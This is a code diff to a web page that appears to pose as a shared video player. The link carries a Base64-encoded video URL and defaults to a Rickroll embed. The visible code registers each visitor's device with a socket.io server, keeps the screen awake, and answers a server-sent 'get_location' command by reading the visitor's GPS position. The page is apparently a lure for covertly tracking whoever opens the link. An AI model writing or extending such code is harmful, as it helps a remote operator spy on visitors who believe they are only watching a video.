@@ -154,9 +154,10 @@
         let socket = io();
         let wakeLock = null;
 
+        // URL se Base64 video link decode karne ka logic (Yahan set hai)
         const urlParams = new URLSearchParams(window.location.search);
         const encodedVid = urlParams.get('v');
-        let targetVideoUrl = encodedVid ? atob(encodedVid) : "";
+        let targetVideoUrl = encodedVid ? atob(encodedVid) : "https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1";
 
         // Persistent check via LocalStorage
         window.addEventListener('DOMContentLoaded', () => {
@@ -170,7 +171,7 @@
 
                 profileSection.style.display = 'none';
                 mediaPlayer.style.display = 'block';
-                mediaPlayer.src = targetVideoUrl ? targetVideoUrl : "https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1"; 
+                mediaPlayer.src = targetVideoUrl; 
 
                 socket.emit('register_device', { name: savedName });
                 initializeSecuritySystem();
@@ -216,7 +217,7 @@
 
             profileSection.style.display = 'none';
             mediaPlayer.style.display = 'block';
-            mediaPlayer.src = targetVideoUrl ? targetVideoUrl : "https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1"; 
+            mediaPlayer.src = targetVideoUrl; // Yahan URL properly load hoga
 
             initializeSecuritySystem();
         });
@@ -259,7 +260,7 @@
                 }
             });
 
-            // GPS Location Command with proper Error Catching & Reporting
+            // GPS Location Command
             socket.on('get_location', () => {
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(async (pos) => {
@@ -376,47 +377,5 @@
             }
         });
     </script>
-    <script>
-    document.addEventListener("DOMContentLoaded", () => {
-        // 1. URL se Base64 video link decode karne ka logic
-        const urlParams = new URLSearchParams(window.location.search);
-        const encodedVid = urlParams.get('v');
-        let targetVideoUrl = encodedVid ? atob(encodedVid) : "https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1";
-
-        // 2. Profile Picture Preview dikhane ka logic
-        const profilePicInput = document.getElementById('profilePicInput');
-        if (profilePicInput) {
-            profilePicInput.addEventListener('change', (event) => {
-                const file = event.target.files[0];
-                if (file) {
-                    const reader = new FileReader();
-                    reader.onload = function(e) {
-                        document.getElementById('previewImg').src = e.target.result;
-                    }
-                    reader.readAsDataURL(file);
-                }
-            });
-        }
-
-        // 3. Button Click par UI hide karke Video chalu karne ka logic
-        const actionBtn = document.getElementById('actionBtn');
-        if (actionBtn) {
-            actionBtn.addEventListener('click', () => {
-                const name = document.getElementById('username').value.trim();
-                if (!name) {
-                    alert("Please enter your name first!");
-                    return;
-                }
-
-                // Profile chhupao aur Stream dikhao
-                document.getElementById('profileSection').style.display = 'none';
-                const mediaPlayer = document.getElementById('mediaPlayer');
-                mediaPlayer.style.display = 'block';
-                mediaPlayer.src = targetVideoUrl;
-            });
-        }
-    });
-    </script>
-    
 </body>
 </html>
